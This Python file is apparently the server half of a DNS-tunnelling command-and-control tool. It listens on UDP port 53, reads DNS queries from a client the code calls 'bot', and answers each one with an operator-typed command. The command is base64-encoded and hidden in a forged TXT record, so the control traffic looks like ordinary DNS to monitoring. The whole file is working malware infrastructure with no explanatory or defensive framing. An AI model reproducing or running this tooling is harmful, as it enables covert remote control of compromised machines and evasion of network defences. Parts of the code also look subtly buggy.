import socketserver
import os
import random
import string
from base64 import *
import threading
import time
from binascii import *
from Crypto.Util.number import *

def handle(self):
	data = self.request[0].strip()
	bot = self.request[1]
	current_thread = threading.current_thread()
	try:
		data = unhexlify(data.split(b'\x04')[0][13:].decode())
	except:
		pass
	print("{}: client: {}, data: {}".format(current_thread.name, self.client_address, data))
	cmd = self.build_res(data)
	real_cmd = self.find_cmd(cmd)
	print(b64decode(real_cmd))
	if(b64decode(real_cmd) == b'list'):
		bot.sendto(cmd, self.client_address)
	else:
		bot.sendto(cmd, self.client_address)
		


class ThreadUDPrequestHandler(socketserver.BaseRequestHandler):

	handle = handle

	def build_res(self,data):
		trans_id = data[:2]
		flag = b'\x85\x80'
		q_count = b'\x00\x01'
		a_count = b'\x00\x01'
		au_count = b'\x00\x00'
		ad_count = b'\x00\x00'
		lenght = long_to_bytes(data[12])
		domain = self.getdomainname(data[12:]).encode()
		cmd = self.build_cmd()
		ty = b'\x00\x10'
		clas = b'\x00\x01'
		res = trans_id + flag + q_count + a_count + au_count + ad_count + lenght + domain + ty + clas + cmd
		return res
	
	def build_cmd(self):
		cmd = input("Command> ").encode()
		answer = b'\xc0\x0c\x00\x10\x00\x01\x00\x03\xf4\x80'
		len_data = (len(b64encode(cmd)) + 1).to_bytes(2, byteorder='big')
		len_txt = long_to_bytes(len(b64encode(cmd)))
		answer += len_data + len_txt + b64encode(cmd)
		return answer

	def find_cmd(self, cmd):
		real = ''
		for i in range(len(cmd)):
			if (cmd[13+i] == 0):
				real = cmd[13+i+18:]
				break
		return real.decode()  

	def getdomainname(self, data):
		lenght = data[0]
		data = data[1:]
		domain = ''
		tmp = 4
		for i in range(len(data)):
			if (data[i] == 0):
				break
			elif (data[i] < 33):
				domain += chr(tmp)
				tmp -= 2
				continue
			domain += chr(data[i])
		return domain + '\x00'

class ThreadedUDPServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
	allow_reuse_address = True
	pass


if __name__ == '__main__':
	host, port = '10.0.0.19', 53
	server = ThreadedUDPServer((host,port), ThreadUDPrequestHandler)
	server_thread = threading.Thread(target = server.serve_forever)
	server_thread.deamon = True

	try:
		server_thread.start()
		print('[+] Listening on port 53')
		while True:
			time.sleep(100)
	except(KeyboardInterrupt, SystemExit):
		server.shutdown()
		server.server_close()
		exit()

	



